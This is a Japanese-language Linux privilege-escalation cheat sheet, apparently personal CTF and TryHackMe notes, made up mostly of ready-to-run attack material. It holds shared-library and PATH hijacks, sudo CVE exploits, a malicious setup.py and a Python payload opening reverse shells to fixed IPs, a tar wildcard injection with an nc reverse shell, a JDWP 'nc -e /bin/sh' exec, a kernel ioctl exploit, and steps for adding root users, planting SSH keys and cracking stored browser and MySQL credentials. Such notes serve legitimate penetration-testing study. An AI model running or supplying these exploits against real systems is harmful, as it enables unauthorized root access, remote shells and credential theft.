# 権限昇格

## Enumeration

### ホスト情報

```shell
hostname
uname -a
cat /proc/version
cat /etc/issue
cat /etc/passwd
cat /etc/os-release
sudo --version

# ルートに変わったディレクトリやファイルがないか？
ls -al /
```

```sh
# Ubuntu 14.04, kernel 3.13 のカーネルエクスプロイトを探す例
searchsploit ubuntu 14.04 3.13
```

### プロセス

```shell
# 全プロセス、ツリー状
ps aux
ps axjf
```

### インストールバージョン

```sh
dpkg -l | grep nginx
```

### 環境変数

```shell
env
```

www-data 等のため gcc が正常に動かないとき、export PATH。

```sh
www-data@ubuntu:/tmp$ gcc -o exploit ./37292.c
gcc: error trying to exec 'cc1': execvp: No such file or directory

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

### パスワード

```sh
cat /var/www/html/.htpasswd

cat /etc/fstab
```

### ユーザーの権限とグループ

```shell
# 他のユーザーも確認できる
id <user>

# 通常はrootしか読めないが、不自然に読めたらCTF的に要注意
ls -al /etc/sudoers.d
```

### SSH

```sh
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```

### 特定ユーザーが所有するファイル一覧

```shell
find / -user <name> -type f -not -path "/proc/*" 2>/dev/null

find / -group <group> -type f -not -path "/proc/*" 2>/dev/null
```

### SUID が設定されているファイルを検索

見落とすことがよくあるので、何もないと思っても、出力をChatGPTにダブルチェックしてもらう。

```shell
# 環境によって動作が変わるので両方試す
$ find / -perm 04000 -type f -ls 2>/dev/null
# or
$ find / -perm -u=s -type f -ls 2>/dev/null

# SGIDはこう
$ find / -perm 02000 -type f -ls 2>/dev/null

$ find / -perm -g=s -type f -ls 2>/dev/null
```

### setuidバイナリを検索

```sh
getcap -r / 2>/dev/null
```

### doas

```sh
$ cat /usr/local/etc/doas.conf
```

### shファイルを検索

```sh
find / -name '*.sh' -not -path "/usr/src/*" 2>/dev/null
```

### 書き込み可能なディレクトリを検索

```shell
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

- ファイル自体のパーミッション
- ファイルを保持するディレクトリのパーミッション（ファイル自体に書き込み権限が無くても、ディレクトリに書き込み権限があれば削除＆作成が可能）

### バックアップ

ここらへんに何か入っていることはよくある。

```sh
ls -al /var/backups
ls -al /opt
ls -al /etc/ssh
```

### 過去 5 分以内に変更されたファイル

```shell
find / -type f -cmin -5 2>/dev/null | grep -v '^/proc/'
```

### .bash_history

```shell
cat .bash_history
```

### キーワードでファイル検索

-I でバイナリファイルを除き、/dev/null でファイル名も出力されるようにしている

```shell
# どのパスを除外するかは場合による
find / -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/usr/share/*" -not -path "/usr/src/*" -not -path "/snap/*" -not -path "/usr/include/*" -not -path "/var/lib/*" -not -path "/usr/lib/*" -not -path "/snap/core*" -exec grep -i -I "password" {} /dev/null \; 2>/dev/null | awk 'length($0) < 1000'

# 特定のファイル名を参照しているバイナリを見つける意図
find / -type f -not -path "/proc/*" -not -path "/sys/*" -exec grep -a ".passwords" {} /dev/null \; 2>/dev/null

# backup ディレクトリを検索
find / -type d -name "*backup*" 2>/dev/null

# 1000文字以上の行を除外するフィルター（難読化スクリプトなど）
 | awk 'length($0) < 1000'
```

キーワード例

```text
password, sudo, backup
```

### ログイン時自動実行スクリプト

```shell
ls -al /etc/update-motd.d

ls -a /home/*/.config/autostart
```

### linux-exploit-suggester

```shell
cd /usr/share/linux-exploit-suggester
./linux-exploit-suggester.sh -k 2.6.32
```

### metasploit suggester

```shell
meterpreter > run post/multi/recon/local_exploit_suggester
```

### ネットワーク

```shell
ifconfig
ip route
netstat -a
```

### 自動 Enum ツール

[LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)  
[LinEnum](https://github.com/rebootuser/LinEnum)  
[LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)  
[Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)  
[Linux Priv Checker](https://github.com/linted/linuxprivchecker)

## suid 付きプログラムの解析

suid や sudo を設定してはいけないコマンド一覧  
[GTFOBins](https://gtfobins.github.io/)

### プログラムが読み込む so やその他のファイル 等を調べる

so を配置可能な場合、so の初期化処理で任意のコードを実行できる

```shell
strace ../bin/foo 2>&1

# grep
strace ../bin/foo 2>&1 | grep -i -E "open|access|no such file"
```

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

```sh
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```

### プログラムに含まれる文字列を調べる

```shell
$ strings ../bin/foo
abc
...
service httpd start
...
```

### PATH 挿入による実行ファイル差し替え

```shell
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
gcc /tmp/service.c -o /tmp/service
export PATH=/tmp:$PATH

# serviceを実行するのが分かっているSUID付きのプログラム
../bin/foo
```

### 関数挿入

絶対パス指定でも必ずしも安全ではない。

```sh
$ strings /usr/local/bin/suid-env2
/lib64/ld-linux-x86-64.so.2
(中略)
/usr/sbin/service apache2 start

$ function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }

$ export -f /usr/sbin/service

$ /usr/local/bin/suid-env2
```

- SUIDバイナリのC言語のコードで、`clearenv();` を実行することで防げる。
- `system(), popne()` ではなく、`execve("/usr/sbin/service", argv, envp)` を使用することも重要。


### エディターなどに SUID が付いている場合

```shell
# パスワードハッシュを出力
openssl passwd -1 -salt SALT password1

# passwdに追加
nano /etc/passwd
```

### bash のバージョンが古い場合

```shell
# 4.2-048 未満の場合
/bin/bash --version

# 実行ファイルと同じ形式のシェル関数を定義する
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service

# /usr/sbin/service を起動するプログラム
/usr/local/bin/suid-env2
```

```shell
# 4.4 以降では動作しない方法
# デバッグ モードで Bash は環境変数 PS4 を使用して、デバッグ ステートメントの追加プロンプトを表示する
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2

/tmp/rootbash -p
```

## sudo 自体の脆弱性

```shell
sudo --version
```

バージョンが適合していても必ずしも有効とは限らない。

### CVE-2019-14287

`versions < 1.8.28`

https://tryhackme.com/room/sudovulnsbypass

- 「root 以外で」 sudo 権限がある場合に使える。

```
<user> ALL=(ALL:!root) NOPASSWD: ALL
```

```shell
$ sudo -u#-1 <cmd>
```

### CVE-2021-3156

`1.8.2 ～ 1.8.31p2` および `1.9.0 ～ 1.9.5p1`

https://tryhackme.com/room/sudovulnssamedit

- sudo 権限が無くても使える

#### 判別法

```shell
# これでプログラムがクラッシュする場合、脆弱性がある可能性
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```

#### kali

```shell
git clone https://github.com/CptGibbon/CVE-2021-3156.git
tar -czf cve.tar.gz ./CVE-2021-3156
python -m http.server
```

#### target

```shell
wget http://<kali>/cve.tar.gz
tar -xzf cve.tar.gz
cd CVE-2021-3156
make
./exploit
```

### CVE-2019-18634

`version <= 1.8.30`

- sudo 権限が無くても使える
- パスワード入力でアスタリスクが表示されたら要注意

https://tryhackme.com/room/sudovulnssamedit  
1.8.26 未満と書かれているが、1.8.31 で完全に修正されたと思われる。

```shell
wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/refs/heads/master/exploit.c

# target 上でコンパイルできるなら、static は不要
gcc -static -o exploit exploit.c
```

## sudo 設定の脆弱性

```shell
# 権限のないユーザーが実行するとインシデント通知が出る可能性があるので注意！
sudo -l
```

### sudo設定のパラメータ有無について

パラメータ無しで実行ファイルのパスだけ指定されている場合、任意のパラメータを付けて実行することができる。  
sudo 設定にパラメータが付いている場合、その他のパラメータを付けると実行時エラーになる。

```sh
(root) NOPASSWD: /usr/bin/php
```

```sh
sudo /usr/bin/php -r "system('/bin/sh');"
```

### env_keep+=LD_PRELOAD が許可されている場合

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash -p");
}
```

```shell
$ gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
# sudo LD_PRELOAD=... <command> の順
$ sudo LD_PRELOAD=/tmp/x.so nmap
```

### sudo pip install が許可されている場合

不正な setup.py を使うことで、root でリバースシェルの起動が可能  
https://github.com/0x00-0x00/FakePip/tree/master

空のディレクトリを作ってその中に setup.py を入れると良い。

```shell
wget http://<ip>/setup.py
sudo pip install . --upgrade
```

（ちなみに）ユーザーごとにインストールしたい場合はこれでよい

```shell
pip install --user
```

そのままではエラーが出たので少し修正したバージョン

```python
from setuptools import setup
from setuptools.command.install import install
import base64
import os

class CustomInstall(install):
  def run(self):
    install.run(self)

    import socket,subprocess,os;
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
    s.connect(("192.168.129.60",9999));
    os.dup2(s.fileno(),0);
    os.dup2(s.fileno(),1);
    os.dup2(s.fileno(),2);
    import pty;
    pty.spawn("/bin/sh")

setup(name='FakePip', 
      version='0.0.1',
      description='This will exploit a sudoer able to /usr/bin/pip install *',
      url='https://github.com/0x00-0x00/fakepip',
      author='zc00l',
      author_email='andre.marques@esecurity.com.br',
      license='MIT', 
      zip_safe=False,
      cmdclass={'install': CustomInstall})
```

### python で SETENV が許可されている場合

```
(root) SETENV: NOPASSWD: /usr/bin/python3 /home/foo/foo.py
```

```python
def md5(dummy):
    import socket,subprocess,os;
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
    s.connect(("192.168.129.60",8888));
    os.dup2(s.fileno(),0);
    os.dup2(s.fileno(),1);
    os.dup2(s.fileno(),2);
    import pty;
    pty.spawn("/bin/sh")
```

```sh
sudo PYTHONPATH=/tmp /usr/bin/python3 /home/foo/foo.py
```

## ファイルキャパビリティ

### cap_setuid

```shell
# キャパビリティが付いているファイルを検索
getcap -r / 2>/dev/null
（出力例）
/home/karen/vim = cap_setuid+ep

# vimにsetuidキャパビリティが付いているとして
./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

```python
python

>> import os
>> os.setuid(0)
>> os.system("/bin/bash")
```

### cap_chown

```sh
/usr/local/bin/ruby = cap_chown+ep
```

/etc/shadow や /etc/passwd のオーナーを変えれば簡単にroot昇格可能。

```sh
python -c 'import os;os.chown("/etc/shadow",1000,1000)'

ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```

### cap_dac_read_search

read権限をバイパスする権限。

```sh
tar xf /etc/shadow -I '/bin/sh -c "cat 1>&2"'
```

### =ep

全てのケーパビリティが付いていることを意味する。何ができるかはコマンドによる。

## cron 関連

コマンドが相対パスやワイルドカードを使ってないかも注意！

```shell
cat /etc/crontab

ls -al /etc/cron*

ls /var/spool/cron/crontabs

ls -al /etc/periodic/*/
```

## su から親プロセスに戻る

rootから `su <user>` に切り替えてでプロセスが起動しているとき。exitだとプロセスが終了してしまうが、SIGSTOPを送ることで親プロセスに戻ることができる。

```python
#!/usr/bin/env python3
import fcntl
import termios
import os
import signal

os.kill(os.getppid(), signal.SIGSTOP)

# TIOCSTI（Terminal Inject Characters）攻撃。
# この形で実行できるのは、rootのみ。
for char in 'chmod +s /bin/bash\n':
    fcntl.ioctl(0, termios.TIOCSTI, char)
```

```sh
# su kali         

$ python ./sig.py      
zsh: suspended (signal)  su kali

# 
```

`-` を付けて切り替える場合、.bashrc が読み込まれるのでPython起動のトリガーにできる。

```sh
su - <user>
```

```sh
echo 'python3 /home/<user>/user2root.py' >> /home/<user>/.bashrc
```

## NFS (ネットワークファイルシステム)

（ターゲット）no_root_squash オプションが設定されていないか

```shell
$ cat /etc/exports
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

（攻撃マシン）マウント可能な共有を列挙

```shell
$ showmount -e 10.10.17.160
Export list for 10.10.17.160:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *
```

（攻撃マシン）

```shell
# マウント
$ mkdir /tmp/targetbackup
$ sudo mount -o rw <ip>:/home/backup /tmp/targetbackup
$ sudo chmod 777 /tmp/targetbackup
$ cd /tmp/targetbackup

# マウントしているので攻撃マシンでもコンパイルできるが、
# 環境の違いによりターゲット側で実行したらエラーになる可能性がある事に注意
$ echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > poc.c
$ gcc poc.c -o poc

# no_root_squash 設定のため、SUID設定できる
$ chmod +s ./poc

$ ls -al
total 24
drwxrwxrwx  2 root root  4096 Dec 18 03:39 .
drwxrwxrwt 15 root root   340 Dec 18 03:39 ..
-rwsrwsr-x  1 kali kali 16056 Dec 18 03:39 poc
-rw-rw-r--  1 kali kali    68 Dec 18 03:39 poc.c
```

### シェルで対象ディレクトリに入れる場合

1. ターゲット上で bash をコピー
2. kali 上で、root オーナー化、SUID 付与

とすれば、わざわざビルドする必要はない。

### ポートが外部に開いていない場合

```sh
# ターゲット上でポートを特定
rpcinfo -p

# トンネリング
ssh <targetuser>@<TARGET-IP> -i id_rsa -L 2049:localhost:2049
```

## 任意のファイルに書き込み可能な場合

### ユーザー追加

/etc/passwd を編集可能であれば、直接 root 権限のユーザーを作成できる。  
SSH 接続はできないので su で昇格する。

```shell
# ハッシュ作成
openssl passwd -1 -salt <salt> <password>
# or
mkpasswd -m sha-512 <password>

# passwd 更新
echo <name>:<hash>:0:0:root:/root:/bin/bash >> /etc/passwd

# su で昇格
su - <name>
```

### ~/.ssh/authorized_keys

```shell
# 鍵ペア生成
$ ssh-keygen -t rsa

# 公開鍵
$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCdq9v/rOMli7XarXvcFBMcbTHdSCPpX388bvUXOYsT2p4wdm4pm2EpE6XVt3IFG/Y5Qrs7Y1bWcaPwGkrsTrhEOlMdQnNPmgo0eroHv7emGPQgayzwG8CHn61B8MRRe8sn8tDBDsquftGXxbiWFVMBlvGwnnttyTeOdktfJ52p0x/mEIVRfkyS7Lr8AkZtOBV0cUhHwz/kOp4Qrl2xCvtLDvc7Ricl7aYch2YOomcRjJhEmUGf57CDA0cScLR/T5cgwbsTrqtNHwX2QciMSNvBMl6ZUvhs2Miy/FmYFwVXD2RC9w7g93lRP4DlkNAySbLVjfB7XwhrwBIOMXiQoRwP8XMtU3w2xDt7kz6NvyS7U6z16QfQgNpzRo0KzbQHxBayrvoaHiMWxM2UEAGkfbbgdaSpEma33lFf8Efaqycqac9k3MZJB86H4EvVdnBwpIPRbyDqHNimBGsaYDJF6KJOetEhrN7C0pcTtFC0Md5mh8WpRySfJZvCZvGZeluBqQU= kali@kali
```

```shell
# /root/.ssh に公開鍵を書き込む
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCdq9v/rOMli7XarXvcFBMcbTHdSCPpX388bvUXOYsT2p4wdm4pm2EpE6XVt3IFG/Y5Qrs7Y1bWcaPwGkrsTrhEOlMdQnNPmgo0eroHv7emGPQgayzwG8CHn61B8MRRe8sn8tDBDsquftGXxbiWFVMBlvGwnnttyTeOdktfJ52p0x/mEIVRfkyS7Lr8AkZtOBV0cUhHwz/kOp4Qrl2xCvtLDvc7Ricl7aYch2YOomcRjJhEmUGf57CDA0cScLR/T5cgwbsTrqtNHwX2QciMSNvBMl6ZUvhs2Miy/FmYFwVXD2RC9w7g93lRP4DlkNAySbLVjfB7XwhrwBIOMXiQoRwP8XMtU3w2xDt7kz6NvyS7U6z16QfQgNpzRo0KzbQHxBayrvoaHiMWxM2UEAGkfbbgdaSpEma33lFf8Efaqycqac9k3MZJB86H4EvVdnBwpIPRbyDqHNimBGsaYDJF6KJOetEhrN7C0pcTtFC0Md5mh8WpRySfJZvCZvGZeluBqQU= kali@kali" > /root/.ssh/authorized_keys
```

## ワイルドカード

```shell
# root の cron でバックアップが実行されているとする
tar cf /home/milesdyson/backups/backup.tgz *

# --checkpoint-action=exec=sh shell.sh --checkpoint=1 がオプションとして誤認され、リバースシェルが実行される
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.22.182 8889 >/tmp/f" > shell.sh
$ touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
$ touch "/var/www/html/--checkpoint=1"
```

## lxd 権限昇格

https://www.hackingarticles.in/lxd-privilege-escalation/

lxd グループに入っていることが必要条件（id コマンドで確認）

```shell
$ id
uid=1000(john) gid=1000(john) groups=1000(john),108(lxd)
```

```shell
# kali
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine

python -m http.server
```

```shell
# target
cd /tmp
wget http://10.2.22.182:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz

# インポート
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage

# 結果確認
lxc image list

# コンテナを実行
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh

# ホストOSの /rootが、/mnt/root/root にマウントされている
cd /mnt/root/root
```

## サービス

- sudo でサービスの再起動できる
- 設定ファイル（/lib/systemd/system/vsftpd.service 等）を編集できる

  場合、起動時のコマンドを root で実行できる。

```text
User=root
ExecStart=/bin/chmod +s /bin/bash
```

```shell
$ systemctl daemon-reload
$ sudo /usr/sbin/service vsftpd restart
```

sudo で sudoedit が許可されている場合、それを使ってサービスの設定を編集できる。

```sh
sudoedit /etc/systemd/system/<foo>.service
```

- サービス自体は変更不可でも、設定ファイル等が不自然に書き込み可能になっている場合は要注意。

```sh
find /etc/apache2 -writable -type f 2>/dev/null

ls -al /etc/apache2
```

## openvpn

ovpn ファイルの編集が可能で、openvpn を 昇格ユーザーとして実行できる場合、ovpn ファイルの内容を下記3行だけにすることにより昇格可能。

```txt
dev null
script-security 2
up "/bin/sh -c sh"
```

```sh
sudo /usr/sbin/openvpn /opt/openvpn/client.ovpn
```

下記コマンドと同等。

```sh
sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
```


## アプリケーションが保存している資格情報

### Firefox

```shell
# プロフィールをロードすれば、Firefoxの設定画面からパスワードを読める。
firefox --profile .firefox/b5w4643p.default-release --allow-downgrade
```

ただし、プライマリパスワードが設定されている場合、入力しない限り読めない。

#### プライマリパスワードクラック

https://github.com/unode/firefox_decrypt

firefox_decrypt 自体にはプライマリパスワードをクラックする機能はないが、シェルスクリプトを利用してクラックする方法がある。

```shell
git clone https://github.com/unode/firefox_decrypt.git
```

```shell
#!/bin/bash

if [[ ! -f ./firefox_decrypt/firefox_decrypt.py ]]; then
    echo "can't find decrypter"
    exit 1
elif [[ ! -d ./firefox_creds/firefox ]]; then
    echo "cant find cred file"
    exit 2
fi

while read password; do
    if echo -e "2\n$password" | firefox_decrypt/firefox_decrypt.py ./firefox_creds/firefox &>/dev/null; then
        echo "Password found: $password"
        echo -e "2\n$password" | firefox_decrypt/firefox_decrypt.py ./firefox_creds/firefox
        exit 0
    fi
done < /usr/share/wordlists/rockyou.txt
echo "Password not found"
exit 3
```

（出展）https://github.com/Sma-Das/TryHackMe/blob/main/Chronicle/README.md

### MySQL

https://github.com/hashcat/hashcat/issues/2305

- mysql.user.authentication_string は `$A$005$` で始まるハッシュ
- mysqlにパスワードでログインするためのパスワードハッシュが保存されている

```sql
use mysql;

-- 印字不可能文字を含むバイナリのためhexに変換している
mysql> select User, hex(authentication_string) from user;
```

[hashcat(7401) に準拠したハッシュを出力するクエリ](https://0xb0b.gitbook.io/writeups/tryhackme/2024/clocky)

```sh
mysql> SELECT user, CONCAT('$mysql',LEFT(authentication_string,6),'*',INSERT(HEX(SUBSTR(authentication_string,8)),41,0,'*')) AS hash FROM user WHERE plugin = 'caching_sha2_password' AND authentication_string NOT LIKE '%INVALIDSALTANDPASSWORD%';
```

1. `$A$005` を取り出す
2. `$A$005$` の後ろの部分を切り出し、HEX文字列変換
3. HEX文字列の 41 文字目に `*` を挿入（ソルトが20文字であり、HEX化により40桁になっているため）
4. 最終的に、`$mysql$A$005*<hex_salt>*<hex_hash>` の形に結合

## ツール

### LinEnum

https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

### linPEAS

サジェスターツール  
https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

```shell
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

wget http://<ip>/linpeas.sh
chmod +x ./linpeas.sh
./linpeas.sh
```

### dirtycow

有名特権昇格ツール  
https://www.exploit-db.com/download/40611

```shell
$ gcc cow.c -pthread -o dcw
$ ./dcw
^C
$ pwd
#
```

## その他のプロセス

### JDWP（Java Debug Wire Protocol）

```sh
# JDWP を開いて起動する java オプションの例
java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=127.0.0.1:18001 -jar app.jar
```

Ghidra が、ローカル 18001 ポートを開いているとする。

```sh
# 18001 ポートにアタッチ
www-data@ubuntu:/home/veronica$ jdb -attach localhost:18001
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...

# log4j の監視スレッドにブレークポイントを設定
> stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
Set breakpoint org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
>
Breakpoint hit: "thread=Log4j2-TF-4-Scheduled-1", org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run(), line=96 bci=0

Log4j2-TF-4-Scheduled-1[1]

# 任意のコードを実行
print new java.lang.Runtime().exec("nc 10.13.85.243 6688 -e /bin/sh")
 new java.lang.Runtime().exec("nc 10.13.85.243 6688 -e /bin/sh") = "Process[pid=7266, exitValue="not exited"]"
Log4j2-TF-4-Scheduled-1[1]
```

## カーネルモジュール

### Diamorphine（ルートキット）

https://github.com/m0nad/Diamorphine

root として koファイルを insmod できる場合。具体例は、Athena CTF 参照。

### ko

```sh
lsmod | grep <mod-name>

# koファイルをghidraで解析するために探す
find / -name '<mod-name>.ko' 2>/dev/null
```

ioctl にインタラクトする例。

https://jaxafed.github.io/posts/tryhackme-aoc2025_sidequest_two/

```python
from fcntl import ioctl
import struct, os, pty

IOCTL_UPDATE_CONF = 0x40933702
IOCTL_HEARTBEAT   = 0xc0b33701
IOCTL_EXEC_OP     = 0x133703

fd = os.open("/dev/kagent", os.O_RDONLY)

buf = bytearray(b"A"*16 + b"\x00"*144)
ioctl(fd, IOCTL_HEARTBEAT, buf)
leaked_session_key = buf[69:85]
leaked_op_ping_address = struct.unpack("<Q", buf[85:93])[0]

op_execute_address = leaked_op_ping_address + 0x320

new_config = b""
new_config += leaked_session_key
new_config += b"A"*16 # new agent_id
new_config += b"B"*16 # new session_key
new_config += struct.pack("<Q", op_execute_address) # new current_op

ioctl(fd, IOCTL_UPDATE_CONF, bytearray(new_config))

ioctl(fd, IOCTL_EXEC_OP)

pty.spawn("/bin/sh")
```

```c
long kagent_ioctl(file *f,uint cmd,ulong arg)
{
  long lVar1;
  
  if (cmd == 0x40933702) {
    lVar1 = c2_update_conf(arg);
    return lVar1;
  }
```

## スニペット

pythonでbashをコピー、SUIDを付ける

```python
import shutil
import os
import stat

src = "/bin/bash"
dst = "/dst-dir/bash"

shutil.copy(src, dst)
os.chown(dst, 0, 0)
current_mode = os.stat(dst).st_mode
os.chmod(dst, current_mode | stat.S_ISUID)
```

## linpeasの出力

PermitRootLogin が yes のとき、rootがSSHログインできる。

```sh
╔══════════╣ Analyzing SSH Files (limit 70)

PermitRootLogin yes
```

## 静的バイナリ

バイナリのコピーが必要な場合

https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64

静的バイナリSSH

https://github.com/binary-manu/static-cross-openssh/actions/runs/19603628746

## 情報源

https://gtfobins.github.io/

https://morgan-bin-bash.gitbook.io/linux-privilege-escalation
